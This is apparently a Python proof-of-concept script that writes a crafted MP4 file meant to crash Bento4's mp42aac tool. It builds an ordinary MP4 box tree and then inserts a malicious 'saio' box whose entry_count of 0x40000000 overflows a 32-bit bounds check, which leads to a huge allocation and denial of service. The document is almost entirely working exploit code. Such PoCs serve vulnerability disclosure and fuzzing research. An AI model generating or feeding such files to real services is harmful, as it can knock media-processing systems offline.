#!/usr/bin/env python3
"""
PoC generator for VULN 004 — AP4_SaioAtom Bounds-Check Integer Overflow -> OOM/Null Deref
CVE: TBD
Bento4 mp42aac: AP4_SaioAtom::AP4_SaioAtom() in Ap4SaioAtom.cpp:110

Trigger: saio box with version=0, flags=0, entry_count=0x40000000
Overflow: entry_count * 4 = 0x100000000 -> wraps to 0 in uint32_t arithmetic
Effect: bypasses bounds check, then SetItemCount(0x40000000) -> bad_alloc -> DoS
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_004.mp4")


def box(type_bytes, data=b""):
    """Wrap data in a 4-byte-size + 4-byte-type box."""
    size = 8 + len(data)
    return struct.pack(">I", size) + type_bytes + data


def ftyp_box():
    # brand=isom, version=0x00000200, compat=isom
    data = b"isom" + struct.pack(">I", 0x00000200) + b"isom"
    return box(b"ftyp", data)


def mvhd_box():
    # mvhd v0: 108 bytes total (8 header + 100 data)
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # creation_time
    data += struct.pack(">I", 0)        # modification_time
    data += struct.pack(">I", 1000)     # timescale
    data += struct.pack(">I", 0)        # duration
    data += struct.pack(">i", 0x00010000)  # rate = 1.0
    data += struct.pack(">h", 0x0100)   # volume = 1.0
    data += b"\x00" * 10               # reserved
    # matrix (identity)
    data += struct.pack(">iiiiiiiii",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    data += b"\x00" * 24               # pre_defined
    data += struct.pack(">I", 2)        # next_track_id
    return box(b"mvhd", data)


def tkhd_box():
    # tkhd v0: 92 bytes total (8 header + 84 data)
    data = struct.pack(">B", 0)          # version=0
    data += struct.pack(">BBB", 0, 0, 0x0f)  # flags = 0x00000f
    data += struct.pack(">I", 0)        # creation_time
    data += struct.pack(">I", 0)        # modification_time
    data += struct.pack(">I", 1)        # track_id
    data += struct.pack(">I", 0)        # reserved
    data += struct.pack(">I", 0)        # duration
    data += b"\x00" * 8                # reserved
    data += struct.pack(">h", 0)        # layer
    data += struct.pack(">h", 0)        # alternate_group
    data += struct.pack(">h", 0x0100)   # volume
    data += b"\x00" * 2                # reserved
    # matrix (identity)
    data += struct.pack(">iiiiiiiii",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    data += struct.pack(">I", 0)        # width
    data += struct.pack(">I", 0)        # height
    return box(b"tkhd", data)


def mdhd_box():
    # mdhd v0: 32 bytes total (8 header + 24 data)
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # creation_time
    data += struct.pack(">I", 0)        # modification_time
    data += struct.pack(">I", 44100)    # timescale
    data += struct.pack(">I", 0)        # duration
    data += struct.pack(">H", 0x55C4)   # language (und)
    data += struct.pack(">H", 0)        # pre_defined
    return box(b"mdhd", data)


def hdlr_box():
    # hdlr: handler_type='soun', name=\x00
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # pre_defined
    data += b"soun"                     # handler_type
    data += b"\x00" * 12               # reserved
    data += b"\x00"                     # name (null-terminated empty string)
    return box(b"hdlr", data)


def smhd_box():
    # smhd: 16 bytes total (8 header + 8 data)
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">H", 0)        # balance
    data += struct.pack(">H", 0)        # reserved
    return box(b"smhd", data)


def dref_box():
    # url. entry: self-contained, size=12
    url_data = struct.pack(">B", 0)      # version=0
    url_data += struct.pack(">BBB", 0, 0, 0x01)  # flags=0x000001 (self-contained)
    url_entry = box(b"url ", url_data)   # 8+4=12 bytes

    # dref box data: version+flags + entry_count + entries
    dref_data = struct.pack(">B", 0)     # version=0
    dref_data += b"\x00\x00\x00"        # flags
    dref_data += struct.pack(">I", 1)   # entry_count=1
    dref_data += url_entry
    return box(b"dref", dref_data)


def dinf_box():
    return box(b"dinf", dref_box())


def stsd_box():
    # stsd: empty sample entries
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # entry_count=0
    return box(b"stsd", data)


def stts_box():
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # entry_count=0
    return box(b"stts", data)


def stsc_box():
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # entry_count=0
    return box(b"stsc", data)


def stsz_box():
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # sample_size=0
    data += struct.pack(">I", 0)        # sample_count=0
    return box(b"stsz", data)


def stco_box():
    data = struct.pack(">B", 0)          # version=0
    data += b"\x00\x00\x00"             # flags
    data += struct.pack(">I", 0)        # entry_count=0
    return box(b"stco", data)


def saio_box():
    """
    Malicious saio box:
      version=0, flags=0 (bit 0=0, so no aux_info_type fields)
      entry_count = 0x40000000 -> entry_count * 4 overflows uint32_t to 0
      4 dummy bytes of data after entry_count so remains > 0 at check
    Data section: 1(ver)+3(flags)+4(entry_count)+4(dummy) = 12 bytes
    Total box: 8(header) + 12(data) = 20 bytes
    """
    data = struct.pack(">B", 0)              # version=0
    data += b"\x00\x00\x00"                 # flags=0x000000 (bit 0 clear -> no aux fields)
    data += struct.pack(">I", 0x40000000)   # entry_count = 0x40000000
    data += b"\x00\x00\x00\x00"            # 4 dummy bytes (ensures remains > 0)
    return box(b"saio", data)


def stbl_box():
    data = (stsd_box() + stts_box() + stsc_box() +
            stsz_box() + stco_box() + saio_box())
    return box(b"stbl", data)


def minf_box():
    data = smhd_box() + dinf_box() + stbl_box()
    return box(b"minf", data)


def mdia_box():
    data = mdhd_box() + hdlr_box() + minf_box()
    return box(b"mdia", data)


def trak_box():
    data = tkhd_box() + mdia_box()
    return box(b"trak", data)


def moov_box():
    data = mvhd_box() + trak_box()
    return box(b"moov", data)


def build_mp4():
    return ftyp_box() + moov_box()


if __name__ == "__main__":
    mp4_data = build_mp4()
    with open(OUT_FILE, "wb") as f:
        f.write(mp4_data)
    print(f"[+] Written {len(mp4_data)} bytes to {OUT_FILE}")
    print(f"[+] saio box: version=0, flags=0, entry_count=0x40000000")
    print(f"[+] Integer overflow: 0x40000000 * 4 = 0x100000000 -> wraps to 0 in uint32_t")
    print(f"[+] Bypass check, then SetItemCount(0x40000000) -> bad_alloc -> DoS")
